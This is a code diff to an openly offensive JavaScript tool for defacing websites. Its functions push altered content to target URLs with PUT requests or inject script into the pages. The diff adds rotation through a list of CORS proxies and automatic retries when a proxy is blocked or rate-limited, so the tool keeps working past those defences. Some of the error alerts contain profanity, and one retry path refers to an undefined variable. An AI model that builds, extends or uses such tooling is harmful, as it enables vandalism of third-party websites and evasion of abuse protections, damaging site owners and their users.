@@ -32,12 +32,40 @@ window.onload = function () {
   }
 };
 
+// Load proxies from JSON file
+async function loadProxies() {
+  try {
+    const response = await fetch('/public/main/proxies.json');
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    const data = await response.json();
+    return data.proxies; // Assuming your JSON has a "proxies" key
+  } catch (error) {
+    console.error("Error loading proxies:", error);
+    logAction(`Error loading proxies: ${error}`);
+    return [];
+  }
+}
+
 // CORS Anywhere Proxy (Self-Hosted if possible)
-const corsProxy = 'https://corsproxy.io/?'; // Replace with your own instance if possible. Rate limiting is possible with this proxy.
+let proxies = []; // Array to hold proxies
 
 // Function to fetch content with CORS bypass and error handling
-async function fetchWithCORS(url) {
-  const proxiedUrl = corsProxy + encodeURIComponent(url);
+async function fetchWithCORS(url, attempts = 0) {
+  if (proxies.length === 0) {
+    proxies = await loadProxies(); // Load proxies if not already loaded
+  }
+
+  if (proxies.length === 0) {
+    alert("No proxies available. Check console, asshole.");
+    logAction("No proxies available.");
+    throw new Error("No proxies available");
+  }
+
+  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
+
+  const proxiedUrl = proxy + encodeURIComponent(url);
 
   try {
     const response = await fetch(proxiedUrl, {
@@ -49,6 +77,15 @@ async function fetchWithCORS(url) {
       }
     });
     if (!response.ok) {
+      if (response.status === 403 || response.status === 429) {
+        // If proxy is forbidden or rate limited, try another one
+        if (attempts < proxies.length) {
+          logAction(`Proxy ${proxy} failed, trying another...`);
+          return fetchWithCORS(url, attempts + 1); // Recursive call with next proxy
+        } else {
+          throw new Error(`All proxies failed for URL: ${url}`);
+        }
+      }
       throw new Error(`HTTP error! Status: ${response.status}`);
     }
     return await response.text();
@@ -101,7 +138,7 @@ async function performDefacement(targetURL, defacementCode) {
     // Attempt to PUT the modified content. If that fails, attempt to inject via script tag.
     try {
       // Use a proxy to bypass CORS for PUT requests
-      const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+      const proxiedUrl = proxies.length > 0 ? proxies[0] + encodeURIComponent(targetURL) : targetURL;
 
       const response = await fetch(proxiedUrl, {
         method: 'PUT',
@@ -134,9 +171,20 @@ async function performDefacement(targetURL, defacementCode) {
 }
 
 // Function to inject defacement code using a script tag
-async function injectDefacement(targetURL, defacementCode) {
+async function injectDefacement(targetURL, defacementCode, attempts = 0) {
+  if (proxies.length === 0) {
+    proxies = await loadProxies(); // Load proxies if not already loaded
+  }
+
+  if (proxies.length === 0) {
+    alert("No proxies available. Check console, asshole.");
+    logAction("No proxies available.");
+    throw new Error("No proxies available");
+  }
+
+  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
   try {
-    const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+    const proxiedUrl = proxy + encodeURIComponent(targetURL);
     const response = await fetch(proxiedUrl, {
       method: 'GET',
       mode: 'cors',
@@ -147,6 +195,15 @@ async function injectDefacement(targetURL, defacementCode) {
     });
 
     if (!response.ok) {
+       if (response.status === 403 || response.status === 429) {
+        // If proxy is forbidden or rate limited, try another one
+        if (attempts < proxies.length) {
+          logAction(`Proxy ${proxy} failed, trying another...`);
+          return injectDefacement(url, defacementCode, attempts + 1); // Recursive call with next proxy
+        } else {
+          throw new Error(`All proxies failed for URL: ${url}`);
+        }
+      }
       throw new Error(`HTTP error! Status: ${response.status}`);
     }
 
@@ -235,7 +292,19 @@ infoElement.innerHTML = defacementInfo;
 document.body.appendChild(infoElement);
 
 // Function to add backup functionality
-async function backupWebsite(targetURL) {
+async function backupWebsite(targetURL, attempts = 0) {
+    if (proxies.length === 0) {
+    proxies = await loadProxies(); // Load proxies if not already loaded
+  }
+
+  if (proxies.length === 0) {
+    alert("No proxies available. Check console, asshole.");
+    logAction("No proxies available.");
+    throw new Error("No proxies available");
+  }
+
+  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
+
   try {
     logAction("Backing up website content...");
     const backupContent = await fetchWithCORS(targetURL);
@@ -253,8 +322,19 @@ async function backupWebsite(targetURL) {
 }
 
 // Function to add restore functionality
-async function restoreWebsite(targetURL) {
+async function restoreWebsite(targetURL, attempts = 0) {
   const backupURL = "website_backup.html";
+    if (proxies.length === 0) {
+    proxies = await loadProxies(); // Load proxies if not already loaded
+  }
+
+  if (proxies.length === 0) {
+    alert("No proxies available. Check console, asshole.");
+    logAction("No proxies available.");
+    throw new Error("No proxies available");
+  }
+
+  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
 
   try {
     logAction("Attempting to restore website...");
@@ -262,7 +342,7 @@ async function restoreWebsite(targetURL) {
     const backupContent = await backupResponse.text();
 
     // Use a proxy to bypass CORS for PUT requests
-    const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+    const proxiedUrl = proxies.length > 0 ? proxies[0] + encodeURIComponent(targetURL) : targetURL;
 
     const response = await fetch(proxiedUrl, {
       method: 'PUT',
